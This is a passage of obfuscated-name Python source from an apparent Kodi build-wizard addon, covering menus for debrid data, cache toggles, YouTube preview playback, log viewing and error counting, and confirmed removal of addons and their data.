		OO0O0O000000O00O0 .append ((THEME3 %'Clear %s Data'%O0OOO00OOOO0O00OO ,'RunPlugin(plugin://%s/?mode=clear%s&name=%s)'%(ADDON_ID ,O0O00OOOOO0OOO00O ,O000OO00OOOOOO0OO )))#line:4143
	elif O0000OO0OO00OOO0O =='save':#line:4144
		OO0O0O000000O00O0 =[]#line:4145
		O0O00OOOOO0OOO00O =urllib .quote_plus (OOO0OO0OOO0OOOO0O .lower ().replace (' ',''))#line:4146
		O0OOO00OOOO0O00OO =OOO0OO0OOO0OOOO0O .replace ('Debrid','Real Debrid')#line:4147
		O000OO00OOOOOO0OO =urllib .quote_plus (OOO00OO00000O00O0 .lower ().replace (' ',''))#line:4148
		OOO00OO00000O00O0 =OOO00OO00000O00O0 .replace ('url','URL Resolver')#line:4149
		OO0O0O000000O00O0 .append ((THEME2 %OOO00OO00000O00O0 .title (),' '))#line:4150
		OO0O0O000000O00O0 .append ((THEME3 %'Register %s'%O0OOO00OOOO0O00OO ,'RunPlugin(plugin://%s/?mode=auth%s&name=%s)'%(ADDON_ID ,O0O00OOOOO0OOO00O ,O000OO00OOOOOO0OO )))#line:4151
		OO0O0O000000O00O0 .append ((THEME3 %'Save %s Data'%O0OOO00OOOO0O00OO ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,O0O00OOOOO0OOO00O ,O000OO00OOOOOO0OO )))#line:4152
		OO0O0O000000O00O0 .append ((THEME3 %'Restore %s Data'%O0OOO00OOOO0O00OO ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,O0O00OOOOO0OOO00O ,O000OO00OOOOOO0OO )))#line:4153
		OO0O0O000000O00O0 .append ((THEME3 %'Import %s Data'%O0OOO00OOOO0O00OO ,'RunPlugin(plugin://%s/?mode=import%s&name=%s)'%(ADDON_ID ,O0O00OOOOO0OOO00O ,O000OO00OOOOOO0OO )))#line:4154
		OO0O0O000000O00O0 .append ((THEME3 %'Clear Addon %s Data'%O0OOO00OOOO0O00OO ,'RunPlugin(plugin://%s/?mode=addon%s&name=%s)'%(ADDON_ID ,O0O00OOOOO0OOO00O ,O000OO00OOOOOO0OO )))#line:4155
	elif O0000OO0OO00OOO0O =='install':#line:4156
		OO0O0O000000O00O0 =[]#line:4157
		O000OO00OOOOOO0OO =urllib .quote_plus (OOO00OO00000O00O0 )#line:4158
		OO0O0O000000O00O0 .append ((THEME2 %OOO00OO00000O00O0 ,'RunAddon(%s, ?mode=viewbuild&name=%s)'%(ADDON_ID ,O000OO00OOOOOO0OO )))#line:4159
		OO0O0O000000O00O0 .append ((THEME3 %'Fresh Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=fresh)'%(ADDON_ID ,O000OO00OOOOOO0OO )))#line:4160
		OO0O0O000000O00O0 .append ((THEME3 %'Normal Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=normal)'%(ADDON_ID ,O000OO00OOOOOO0OO )))#line:4161
		OO0O0O000000O00O0 .append ((THEME3 %'Apply guiFix','RunPlugin(plugin://%s/?mode=install&name=%s&url=gui)'%(ADDON_ID ,O000OO00OOOOOO0OO )))#line:4162
		OO0O0O000000O00O0 .append ((THEME3 %'Build Information','RunPlugin(plugin://%s/?mode=buildinfo&name=%s)'%(ADDON_ID ,O000OO00OOOOOO0OO )))#line:4163
	OO0O0O000000O00O0 .append ((THEME2 %'%s Settings'%ADDONTITLE ,'RunPlugin(plugin://%s/?mode=settings)'%ADDON_ID ))#line:4164
	return OO0O0O000000O00O0 #line:4165
def toggleCache (O000OOOOO000OOO00 ):#line:4167
	OO0000OO000O0OO00 =['includevideo','includeall','includebob','includephoenix','includespecto','includegenesis','includeexodus','includeonechan','includesalts','includesaltslite']#line:4168
	O0OOOOOOOO00OO0OO =['Include Video Addons','Include All Addons','Include Bob','Include Phoenix','Include Specto','Include Genesis','Include Exodus','Include One Channel','Include Salts','Include Salts Lite HD']#line:4169
	if O000OOOOO000OOO00 in ['true','false']:#line:4170
		for O0O0OO00O0O0OO0OO in OO0000OO000O0OO00 :#line:4171
			wiz .setS (O0O0OO00O0O0OO0OO ,O000OOOOO000OOO00 )#line:4172
	else :#line:4173
		if not O000OOOOO000OOO00 in ['includevideo','includeall']and wiz .getS ('includeall')=='true':#line:4174
			try :#line:4175
				O0O0OO00O0O0OO0OO =O0OOOOOOOO00OO0OO [OO0000OO000O0OO00 .index (O000OOOOO000OOO00 )]#line:4176
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]You will need to turn off [COLOR %s]Include All Addons[/COLOR] to disable[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ,O0O0OO00O0O0OO0OO ))#line:4177
			except :#line:4178
				wiz .LogNotify ("[COLOR %s]Toggle Cache[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid id: %s[/COLOR]"%(COLOR2 ,O000OOOOO000OOO00 ))#line:4179
		else :#line:4180
			O0O0000OO00O0O0O0 ='true'if wiz .getS (O000OOOOO000OOO00 )=='false'else 'false'#line:4181
			wiz .setS (O000OOOOO000OOO00 ,O0O0000OO00O0O0O0 )#line:4182
def playVideo (O0OO00OOOO00OO00O ):#line:4184
	wiz .log ("YouTube CCCCCCCCCCCCCCCCCCCCCCCCCCC URL: %s"%O0OO00OOOO00OO00O )#line:4185
	if 'watch?v='in O0OO00OOOO00OO00O :#line:4186
		OOO000O0O0O0OOOOO ,O00OOOO0O0OOO0000 =O0OO00OOOO00OO00O .split ('?')#line:4187
		OOO00OOO00O00000O =O00OOOO0O0OOO0000 .split ('&')#line:4188
		for OOOOO00OOO0O00OO0 in OOO00OOO00O00000O :#line:4189
			if OOOOO00OOO0O00OO0 .startswith ('v='):#line:4190
				O0OO00OOOO00OO00O =OOOOO00OOO0O00OO0 [2 :]#line:4191
				break #line:4192
			else :continue #line:4193
	elif 'embed'in O0OO00OOOO00OO00O or 'youtu.be'in O0OO00OOOO00OO00O :#line:4194
		wiz .log ("YouTube BBBBBBBBBBBBBBBBBBBBBBBBB URL: %s"%O0OO00OOOO00OO00O )#line:4195
		OOO000O0O0O0OOOOO =O0OO00OOOO00OO00O .split ('/')#line:4196
		if len (OOO000O0O0O0OOOOO [-1 ])>5 :#line:4197
			O0OO00OOOO00OO00O =OOO000O0O0O0OOOOO [-1 ]#line:4198
		elif len (OOO000O0O0O0OOOOO [-2 ])>5 :#line:4199
			O0OO00OOOO00OO00O =OOO000O0O0O0OOOOO [-2 ]#line:4200
	wiz .log ("YouTube URL: %s"%O0OO00OOOO00OO00O )#line:4201
	yt .PlayVideo (O0OO00OOOO00OO00O )#line:4202
def viewLogFile ():#line:4204
	O000OOO0000OOOO00 =wiz .Grab_Log (True )#line:4205
	OO0O0OO00000O0OOO =wiz .Grab_Log (True ,True )#line:4206
	OOO0O0000O0O0O00O =0 ;O0O0OOO0O0OO00OO0 =O000OOO0000OOOO00 #line:4207
	if not OO0O0OO00000O0OOO ==False and not O000OOO0000OOOO00 ==False :#line:4208
		OOO0O0000O0O0O00O =DIALOG .select (ADDONTITLE ,["View %s"%O000OOO0000OOOO00 .replace (LOG ,""),"View %s"%OO0O0OO00000O0OOO .replace (LOG ,"")])#line:4209
		if OOO0O0000O0O0O00O ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4210
	elif O000OOO0000OOOO00 ==False and OO0O0OO00000O0OOO ==False :#line:4211
		wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4212
		return #line:4213
	elif not O000OOO0000OOOO00 ==False :OOO0O0000O0O0O00O =0 #line:4214
	elif not OO0O0OO00000O0OOO ==False :OOO0O0000O0O0O00O =1 #line:4215
	O0O0OOO0O0OO00OO0 =O000OOO0000OOOO00 if OOO0O0000O0O0O00O ==0 else OO0O0OO00000O0OOO #line:4217
	OO00O0O0O0OOO00OO =wiz .Grab_Log (False )if OOO0O0000O0O0O00O ==0 else wiz .Grab_Log (False ,True )#line:4218
	wiz .TextBox ("%s - %s"%(ADDONTITLE ,O0O0OOO0O0OO00OO0 ),OO00O0O0O0OOO00OO )#line:4220
def errorChecking (log =None ,count =None ,all =None ):#line:4222
	if log ==None :#line:4223
		OO0O00OO0OO0OOO00 =wiz .Grab_Log (True )#line:4224
		O0000000OO0O00O00 =wiz .Grab_Log (True ,True )#line:4225
		if not O0000000OO0O00O00 ==False and not OO0O00OO0OO0OOO00 ==False :#line:4226
			O00000O000O0OO0O0 =DIALOG .select (ADDONTITLE ,["View %s: %s error(s)"%(OO0O00OO0OO0OOO00 .replace (LOG ,""),errorChecking (OO0O00OO0OO0OOO00 ,True ,True )),"View %s: %s error(s)"%(O0000000OO0O00O00 .replace (LOG ,""),errorChecking (O0000000OO0O00O00 ,True ,True ))])#line:4227
			if O00000O000O0OO0O0 ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4228
		elif OO0O00OO0OO0OOO00 ==False and O0000000OO0O00O00 ==False :#line:4229
			wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4230
			return #line:4231
		elif not OO0O00OO0OO0OOO00 ==False :O00000O000O0OO0O0 =0 #line:4232
		elif not O0000000OO0O00O00 ==False :O00000O000O0OO0O0 =1 #line:4233
		log =OO0O00OO0OO0OOO00 if O00000O000O0OO0O0 ==0 else O0000000OO0O00O00 #line:4234
	if log ==False :#line:4235
		if count ==None :#line:4236
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Log File not Found[/COLOR]"%COLOR2 )#line:4237
			return False #line:4238
		else :#line:4239
			return 0 #line:4240
	else :#line:4241
		if os .path .exists (log ):#line:4242
			O000OO0OOOOO00000 =open (log ,mode ='r');O0000OO00OOO0000O =O000OO0OOOOO00000 .read ().replace ('\n','').replace ('\r','');O000OO0OOOOO00000 .close ()#line:4243
			O0OO00OOO0OO0OO00 =re .compile ("-->Python callback/script returned the following error<--(.+?)-->End of Python script error report<--").findall (O0000OO00OOO0000O )#line:4244
			if not count ==None :#line:4245
				if all ==None :#line:4246
					O0OOOO00000OOO0OO =0 #line:4247
					for O000OO00O00OO00OO in O0OO00OOO0OO0OO00 :#line:4248
						if ADDON_ID in O000OO00O00OO00OO :O0OOOO00000OOO0OO +=1 #line:4249
					return O0OOOO00000OOO0OO #line:4250
				else :return len (O0OO00OOO0OO0OO00 )#line:4251
			if len (O0OO00OOO0OO0OO00 )>0 :#line:4252
				O0OOOO00000OOO0OO =0 ;OOOOOOO0OO00O0O0O =""#line:4253
				for O000OO00O00OO00OO in O0OO00OOO0OO0OO00 :#line:4254
					if all ==None and not ADDON_ID in O000OO00O00OO00OO :continue #line:4255
					else :#line:4256
						O0OOOO00000OOO0OO +=1 #line:4257
						OOOOOOO0OO00O0O0O +="[COLOR red]Error Number %s[/COLOR]\n(PythonToCppException) : -->Python callback/script returned the following error<--%s-->End of Python script error report<--\n\n"%(O0OOOO00000OOO0OO ,O000OO00O00OO00OO .replace ('                                          ','\n').replace ('\\\\','\\').replace (HOME ,''))#line:4258
				if O0OOOO00000OOO0OO >0 :#line:4259
					wiz .TextBox (ADDONTITLE ,OOOOOOO0OO00O0O0O )#line:4260
				else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4261
			else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4262
		else :wiz .LogNotify (ADDONTITLE ,"Log File not Found")#line:4263
ACTION_PREVIOUS_MENU =10 #line:4265
ACTION_NAV_BACK =92 #line:4266
ACTION_MOVE_LEFT =1 #line:4267
ACTION_MOVE_RIGHT =2 #line:4268
ACTION_MOVE_UP =3 #line:4269
ACTION_MOVE_DOWN =4 #line:4270
ACTION_MOUSE_WHEEL_UP =104 #line:4271
ACTION_MOUSE_WHEEL_DOWN =105 #line:4272
ACTION_MOVE_MOUSE =107 #line:4273
ACTION_SELECT_ITEM =7 #line:4274
ACTION_BACKSPACE =110 #line:4275
ACTION_MOUSE_LEFT_CLICK =100 #line:4276
ACTION_MOUSE_LONG_CLICK =108 #line:4277
def LogViewer (default =None ):#line:4279
	class OOOO0O000OOOOO0O0 (xbmcgui .WindowXMLDialog ):#line:4280
		def __init__ (O00000O0OOOO00000 ,*O000OOO0O0OO00O0O ,**OO000OOO0O0OO0OOO ):#line:4281
			O00000O0OOOO00000 .default =OO000OOO0O0OO0OOO ['default']#line:4282
		def onInit (O0O00OO00O0O0000O ):#line:4284
			O0O00OO00O0O0000O .title =101 #line:4285
			O0O00OO00O0O0000O .msg =102 #line:4286
			O0O00OO00O0O0000O .scrollbar =103 #line:4287
			O0O00OO00O0O0000O .upload =201 #line:4288
			O0O00OO00O0O0000O .kodi =202 #line:4289
			O0O00OO00O0O0000O .kodiold =203 #line:4290
			O0O00OO00O0O0000O .wizard =204 #line:4291
			O0O00OO00O0O0000O .okbutton =205 #line:4292
			OO00O00O00000O00O =open (O0O00OO00O0O0000O .default ,'r')#line:4293
			O0O00OO00O0O0000O .logmsg =OO00O00O00000O00O .read ()#line:4294
			OO00O00O00000O00O .close ()#line:4295
			O0O00OO00O0O0000O .titlemsg ="%s: %s"%(ADDONTITLE ,O0O00OO00O0O0000O .default .replace (LOG ,'').replace (ADDONDATA ,''))#line:4296
			O0O00OO00O0O0000O .showdialog ()#line:4297
		def showdialog (OOO0O0O0OO000OO0O ):#line:4299
			OOO0O0O0OO000OO0O .getControl (OOO0O0O0OO000OO0O .title ).setLabel (OOO0O0O0OO000OO0O .titlemsg )#line:4300
			OOO0O0O0OO000OO0O .getControl (OOO0O0O0OO000OO0O .msg ).setText (wiz .highlightText (OOO0O0O0OO000OO0O .logmsg ))#line:4301
			OOO0O0O0OO000OO0O .setFocusId (OOO0O0O0OO000OO0O .scrollbar )#line:4302
		def onClick (O0O000O0O0OO0O0O0 ,O000O0000000OOO0O ):#line:4304
			if O000O0000000OOO0O ==O0O000O0O0OO0O0O0 .okbutton :O0O000O0O0OO0O0O0 .close ()#line:4305
			elif O000O0000000OOO0O ==O0O000O0O0OO0O0O0 .upload :O0O000O0O0OO0O0O0 .close ();uploadLog .Main ()#line:4306
			elif O000O0000000OOO0O ==O0O000O0O0OO0O0O0 .kodi :#line:4307
				OO00OOO00O00O00O0 =wiz .Grab_Log (False )#line:4308
				OO00OO0O0O00OO000 =wiz .Grab_Log (True )#line:4309
				if OO00OOO00O00O00O0 ==False :#line:4310
					O0O000O0O0OO0O0O0 .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4311
					O0O000O0O0OO0O0O0 .getControl (O0O000O0O0OO0O0O0 .msg ).setText ("Log File Does Not Exists!")#line:4312
				else :#line:4313
					O0O000O0O0OO0O0O0 .titlemsg ="%s: %s"%(ADDONTITLE ,OO00OO0O0O00OO000 .replace (LOG ,''))#line:4314
					O0O000O0O0OO0O0O0 .getControl (O0O000O0O0OO0O0O0 .title ).setLabel (O0O000O0O0OO0O0O0 .titlemsg )#line:4315
					O0O000O0O0OO0O0O0 .getControl (O0O000O0O0OO0O0O0 .msg ).setText (wiz .highlightText (OO00OOO00O00O00O0 ))#line:4316
					O0O000O0O0OO0O0O0 .setFocusId (O0O000O0O0OO0O0O0 .scrollbar )#line:4317
			elif O000O0000000OOO0O ==O0O000O0O0OO0O0O0 .kodiold :#line:4318
				OO00OOO00O00O00O0 =wiz .Grab_Log (False ,True )#line:4319
				OO00OO0O0O00OO000 =wiz .Grab_Log (True ,True )#line:4320
				if OO00OOO00O00O00O0 ==False :#line:4321
					O0O000O0O0OO0O0O0 .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4322
					O0O000O0O0OO0O0O0 .getControl (O0O000O0O0OO0O0O0 .msg ).setText ("Log File Does Not Exists!")#line:4323
				else :#line:4324
					O0O000O0O0OO0O0O0 .titlemsg ="%s: %s"%(ADDONTITLE ,OO00OO0O0O00OO000 .replace (LOG ,''))#line:4325
					O0O000O0O0OO0O0O0 .getControl (O0O000O0O0OO0O0O0 .title ).setLabel (O0O000O0O0OO0O0O0 .titlemsg )#line:4326
					O0O000O0O0OO0O0O0 .getControl (O0O000O0O0OO0O0O0 .msg ).setText (wiz .highlightText (OO00OOO00O00O00O0 ))#line:4327
					O0O000O0O0OO0O0O0 .setFocusId (O0O000O0O0OO0O0O0 .scrollbar )#line:4328
			elif O000O0000000OOO0O ==O0O000O0O0OO0O0O0 .wizard :#line:4329
				OO00OOO00O00O00O0 =wiz .Grab_Log (False ,False ,True )#line:4330
				OO00OO0O0O00OO000 =wiz .Grab_Log (True ,False ,True )#line:4331
				if OO00OOO00O00O00O0 ==False :#line:4332
					O0O000O0O0OO0O0O0 .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4333
					O0O000O0O0OO0O0O0 .getControl (O0O000O0O0OO0O0O0 .msg ).setText ("Log File Does Not Exists!")#line:4334
				else :#line:4335
					O0O000O0O0OO0O0O0 .titlemsg ="%s: %s"%(ADDONTITLE ,OO00OO0O0O00OO000 .replace (ADDONDATA ,''))#line:4336
					O0O000O0O0OO0O0O0 .getControl (O0O000O0O0OO0O0O0 .title ).setLabel (O0O000O0O0OO0O0O0 .titlemsg )#line:4337
					O0O000O0O0OO0O0O0 .getControl (O0O000O0O0OO0O0O0 .msg ).setText (wiz .highlightText (OO00OOO00O00O00O0 ))#line:4338
					O0O000O0O0OO0O0O0 .setFocusId (O0O000O0O0OO0O0O0 .scrollbar )#line:4339
		def onAction (O00O00O0O000O0OOO ,OO00O0OO0OO0OO0OO ):#line:4341
			if OO00O0OO0OO0OO0OO ==ACTION_PREVIOUS_MENU :O00O00O0O000O0OOO .close ()#line:4342
			elif OO00O0OO0OO0OO0OO ==ACTION_NAV_BACK :O00O00O0O000O0OOO .close ()#line:4343
	if default ==None :default =wiz .Grab_Log (True )#line:4344
	O0O0O00OO0O00OO00 =OOOO0O000OOOOO0O0 ("LogViewer.xml",ADDON .getAddonInfo ('path'),'DefaultSkin',default =default )#line:4345
	O0O0O00OO0O00OO00 .doModal ()#line:4346
	del O0O0O00OO0O00OO00 #line:4347
def removeAddon (OO00O000O00OO0OO0 ,OOO0OO00O00O00O00 ,over =False ):#line:4349
	if not over ==False :#line:4350
		O0O000OO0O00OOOO0 =1 #line:4351
	else :#line:4352
		O0O000OO0O00OOOO0 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Are you sure you want to delete the addon:'%COLOR2 ,'Name: [COLOR %s]%s[/COLOR]'%(COLOR1 ,OOO0OO00O00O00O00 ),'ID: [COLOR %s]%s[/COLOR][/COLOR]'%(COLOR1 ,OO00O000O00OO0OO0 ),yeslabel ='[B][COLOR green]Remove Addon[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]')#line:4353
	if O0O000OO0O00OOOO0 ==1 :#line:4354
		OO0O0O000O00000O0 =os .path .join (ADDONS ,OO00O000O00OO0OO0 )#line:4355
		wiz .log ("Removing Addon %s"%OO00O000O00OO0OO0 )#line:4356
		wiz .cleanHouse (OO0O0O000O00000O0 )#line:4357
		xbmc .sleep (1000 )#line:4358
		try :shutil .rmtree (OO0O0O000O00000O0 )#line:4359
		except Exception as OOOOO0000O000O000 :wiz .log ("Error removing %s"%OO00O000O00OO0OO0 ,xbmc .LOGNOTICE )#line:4360
		removeAddonData (OO00O000O00OO0OO0 ,OOO0OO00O00O00O00 ,over )#line:4361
	if over ==False :#line:4362
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]%s Removed[/COLOR]"%(COLOR2 ,OOO0OO00O00O00O00 ))#line:4363
def removeAddonData (O0000OOOO000OO0O0 ,name =None ,over =False ):#line:4365
	if O0000OOOO000OO0O0 =='all':#line:4366
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4367
			wiz .cleanHouse (ADDOND )#line:4368
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4369
	elif O0000OOOO000OO0O0 =='uninstalled':#line:4370
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder for uninstalled addons?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4371
			OO0OOO000OOO0OOOO =0 #line:4372
			for OOO000O0OO0OO00OO in glob .glob (os .path .join (ADDOND ,'*')):#line:4373
				O00OO0O000O00O0O0 =OOO000O0OO0OO00OO .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:4374
				if O00OO0O000O00O0O0 in EXCLUDES :pass #line:4375
				elif os .path .exists (os .path .join (ADDONS ,O00OO0O000O00O0O0 )):pass #line:4376
				else :wiz .cleanHouse (OOO000O0OO0OO00OO );OO0OOO000OOO0OOOO +=1 ;wiz .log (OOO000O0OO0OO00OO );shutil .rmtree (OOO000O0OO0OO00OO )#line:4377
			wiz .LogNotify ('[COLOR %s]Clean up Uninstalled[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,OO0OOO000OOO0OOOO ))#line:4378
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4379
	elif O0000OOOO000OO0O0 =='empty':#line:4380
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] empty addon data folders in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4381
			OO0OOO000OOO0OOOO =wiz .emptyfolder (ADDOND )#line:4382
			wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,OO0OOO000OOO0OOOO ))#line:4383
		else :wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4384
	else :#line:4385
		O00OO0OO00O000O00 =os .path .join (USERDATA ,'addon_data',O0000OOOO000OO0O0 )#line:4386
		if O0000OOOO000OO0O0 in EXCLUDES :#line:4387
			wiz .LogNotify ("[COLOR %s]Protected Plugin[/COLOR]"%COLOR1 ,"[COLOR %s]Not allowed to remove Addon_Data[/COLOR]"%COLOR2 )#line:4388
		elif os .path .exists (O00OO0OO00O000O00 ):#line:4389
			if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you also like to remove the addon data for:[/COLOR]'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,O0000OOOO000OO0O0 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4390
				wiz .cleanHouse (O00OO0OO00O000O00 )#line:4391
				try :#line:4392
					shutil .rmtree (O00OO0OO00O000O00 )#line:4393
				except :#line:4394
					wiz .log ("Error deleting: %s"%O00OO0OO00O000O00 )#line:4395
			else :#line:4396
				wiz .log ('Addon data for %s was not removed'%O0000OOOO000OO0O0 )#line:4397
	wiz .refresh ()#line:4398
def restoreit (O0O0O00O0OO00O00O ):#line:4400
	if O0O0O00O0OO00O00O =='build':#line:4401
		O0O0O00OO0OO0OOOO =freshStart ('restore')#line:4402
		if O0O0O00OO0OO0OOOO ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Local Restore Cancelled[/COLOR]"%COLOR2 );return #line:4403
	if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary']:#line:4404
		wiz .skinToDefault ()#line:4405
	wiz .restoreLocal (O0O0O00O0OO00O00O )#line:4406
def restoreextit (O0O0000O0O0000000 ):#line:4408
	if O0O0000O0O0000000 =='build':#line:4409
		OO0OOO00OOO0O00OO =freshStart ('restore')#line:4410
		if OO0OOO00OOO0O00OO ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]External Restore Cancelled[/COLOR]"%COLOR2 );return #line:4411
	wiz .restoreExternal (O0O0000O0O0000000 )#line:4412
def buildInfo (OO000O00OOOOO0000 ):#line:4414
	if wiz .workingURL (SPEEDFILE )==True :#line:4415
		if wiz .checkBuild (OO000O00OOOOO0000 ,'url'):#line:4416
			OO000O00OOOOO0000 ,OO0OOOOOOOOOO0O0O ,OOO0O0OOOO0O0OO0O ,OOO0O00O00O0OO00O ,OOOOO0OO0O0000OOO ,OOOO00OO0O0O0OOOO ,OO0O0O0OO000O00OO ,OOOOO000000O0OOOO ,OOOO000O000OOOO0O ,OO0O0000OOO00O0O0 ,O0O0O0O000O0O00OO =wiz .checkBuild (OO000O00OOOOO0000 ,'all')#line:4417
			OO0O0000OOO00O0O0 ='Yes'if OO0O0000OOO00O0O0 .lower ()=='yes'else 'No'#line:4418
			OOOO0O0000OOOOO0O ="[COLOR %s]שם הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OO000O00OOOOO0000 )#line:4419
			OOOO0O0000OOOOO0O +="[COLOR %s]גירסת הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OO0OOOOOOOOOO0O0O )#line:4420
			if not OOOO00OO0O0O0OOOO =="http://":#line:4421
				O0O0OO000O00O0OOO =wiz .themeCount (OO000O00OOOOO0000 ,False )#line:4422
				OOOO0O0000OOOOO0O +="[COLOR %s]Build Theme(s):[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,', '.join (O0O0OO000O00O0OOO ))#line:4423
			OOOO0O0000OOOOO0O +="[COLOR %s]קודי גירסה:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OOOOO0OO0O0000OOO )#line:4424
			OOOO0O0000OOOOO0O +="[COLOR %s]Adult Content:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OO0O0000OOO00O0O0 )#line:4425
			OOOO0O0000OOOOO0O +="[COLOR %s]תאור:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O0O0O0O000O0O00OO )#line:4426
			wiz .TextBox (ADDONTITLE ,OOOO0O0000OOOOO0O )#line:4427
		else :wiz .log ("Invalid Build Name!")#line:4428
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:4429
def buildVideo (OOOO00O0OOO000000 ):#line:4431
	wiz .log ("DDDDDDDDDDDDDDDDDDDDDDDDD: %s"%wiz .workingURL (SPEEDFILE ))#line:4432
	if wiz .workingURL (SPEEDFILE )==True :#line:4433
		OOO0OOO00O0O0000O =wiz .checkBuild (OOOO00O0OOO000000 ,'preview')#line:4434
		wiz .log ("FFFFFFFFFFFFFFFFFFFFFFFFFF: %s"%OOOO00O0OOO000000 )#line:4435
		if OOO0OOO00O0O0000O and not OOO0OOO00O0O0000O =='http://':playVideo (OOO0OOO00O0O0000O )#line:4436
		else :wiz .log ("[%s]Unable to find url for video preview"%OOOO00O0OOO000000 )#line:4437
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:4438
def dependsList (OOOO0OOO00O0O0O0O ):#line:4440
	O0OOOO00OO0O0O00O =os .path .join (ADDONS ,OOOO0OOO00O0O0O0O ,'addon.xml')#line:4441
	if os .path .exists (O0OOOO00OO0O0O00O ):#line:4442
		O00O00OO000O0000O =open (O0OOOO00OO0O0O00O ,mode ='r');OOOOO00O00O000O00 =O00O00OO000O0000O .read ();O00O00OO000O0000O .close ();#line:4443
		O0O0OO0O00O00OOOO =wiz .parseDOM (OOOOO00O00O000O00 ,'import',ret ='addon')#line:4444
		OO00OO000000000O0 =[]#line:4445
		for O0O00OOO0O00OO0O0 in O0O0OO0O00O00OOOO :#line:4446
			if not 'xbmc.python'in O0O00OOO0O00OO0O0 :#line:4447
				OO00OO000000000O0 .append (O0O00OOO0O00OO0O0 )#line:4448
		return OO00OO000000000O0 #line:4449
	return []#line:4450
def manageSaveData (O00OO0OO0000OOO00 ):#line:4452
	if O00OO0OO0000OOO00 =='import':#line:4453
		O00OOOO00000O00OO =os .path .join (ADDONDATA ,'temp')#line:4454
		if not os .path .exists (O00OOOO00000O00OO ):os .makedirs (O00OOOO00000O00OO )#line:4455
		O00000OOOO000OO0O =DIALOG .browse (1 ,'[COLOR %s]Select the location of the SaveData.zip[/COLOR]'%COLOR2 ,'files','.zip',False ,False ,HOME )#line:4456
		if not O00000OOOO000OO0O .endswith ('.zip'):#line:4457
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Import Data Error![/COLOR]"%(COLOR2 ))#line:4458
			return #line:4459
